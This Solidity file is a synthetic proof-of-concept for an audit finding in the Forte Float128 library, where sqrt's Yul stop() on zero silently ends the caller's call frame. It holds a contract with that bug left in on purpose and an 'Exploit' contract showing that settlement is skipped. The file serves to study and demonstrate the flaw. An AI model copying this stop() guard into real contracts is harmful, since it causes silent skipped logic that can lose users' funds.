// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Forte Float128 — [H-02] Sqrt function silently reverts the entire
    control flow when a packed float of 0 value is passed
    (Code4rena 2025-04-forte-float128-solidity-library, finding #55704)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: Float128.sqrt uses Yul `stop()` on packedFloat 0 instead of
    returning 0. `stop()` ≡ `return(0,0)` and terminates the *entire current
    call frame* successfully — any subsequent logic in that frame is silently
    skipped (not reverted). In the real library `sqrt` is `internal pure` and
    is inlined into the caller's bytecode, so the stop kills the caller's
    frame. This synthetic inlines the same guard into a protocol-shaped
    `computeAndSettle` so the harm is observable.

    Guard block preserved from src/Float128.sol
    (commit 4d6694f68e80543885da78666e38c0dc7052d992, ~L703–L713).
//////////////////////////////////////////////////////////////////////////*/

/// @notice Protocol-shaped consumer that inlines Float128.sqrt's zero guard
///         (as the real internal library would) then continues with settlement.
contract VulnerableOracle {
    uint256 constant MANTISSA_SIGN_MASK =
        0x1000000000000000000000000000000000000000000000000000000000000;

    bool public settled;
    uint256 public lastResult;

    /// @dev Inlined Float128.sqrt zero/negative guards + a post-sqrt settlement
    ///      step. On packedFloat 0, `stop()` aborts this entire external call
    ///      before settlement — the outer caller sees success + empty data.
    function computeAndSettle(uint256 a) external returns (uint256 r) {
        // Negative packed floats: same Error(string) path as Float128.sqrt.
        assembly {
            if and(a, MANTISSA_SIGN_MASK) {
                let ptr := mload(0x40)
                mstore(ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)
                mstore(add(ptr, 0x04), 0x20)
                mstore(add(ptr, 0x24), 32)
                mstore(add(ptr, 0x44), "float128: squareroot of negative")
                revert(ptr, 0x64)
            }
        }
        // Zero path isolated so the @> STOP line is only executed for a == 0
        // (mirrors the real `if iszero(a) { stop() }` branch body).
        if (a == 0) {
            assembly {
                stop() // @> VULN: stop() ends the whole call frame; should be `r := 0; leave`
                // FIX: r := 0; leave
            }
        }
        // Settlement that MUST run after sqrt(0) returns 0 mathematically.
        // With the bug, this body is never reached for a == 0.
        lastResult = 0;
        settled = true;
        r = 0;
    }

    function reset() external {
        settled = false;
        lastResult = 0;
    }
}

contract Exploit {
    VulnerableOracle public oracle; // CREATE nonce 1

    constructor() {
        oracle = new VulnerableOracle();
    }

    function run() external {
        // 1) Non-zero path: guard falls through, settlement runs.
        oracle.reset();
        (bool okNz, bytes memory retNz) =
            address(oracle).call(abi.encodeWithSelector(VulnerableOracle.computeAndSettle.selector, uint256(1)));
        require(okNz, "non-zero call must succeed");
        require(retNz.length == 32, "non-zero must return a word");
        require(oracle.settled(), "non-zero path must settle");

        // 2) Zero path: stop() succeeds the subcall with EMPTY returndata and
        //    skips settlement — silent partial execution.
        oracle.reset();
        require(!oracle.settled(), "precondition: unsettled");

        (bool okZ, bytes memory retZ) =
            address(oracle).call(abi.encodeWithSelector(VulnerableOracle.computeAndSettle.selector, uint256(0)));

        // stop() is NOT a revert — the call reports success.
        require(okZ, "sqrt(0) must not REVERT - it silently stops");
        // Empty returndata (return(0,0)), not an ABI-encoded packedFloat 0.
        require(retZ.length == 0, "stop() returns empty data, not packed 0");
        // Settlement body never ran.
        require(!oracle.settled(), "harm: settlement skipped after sqrt(0) stop()");
    }
}
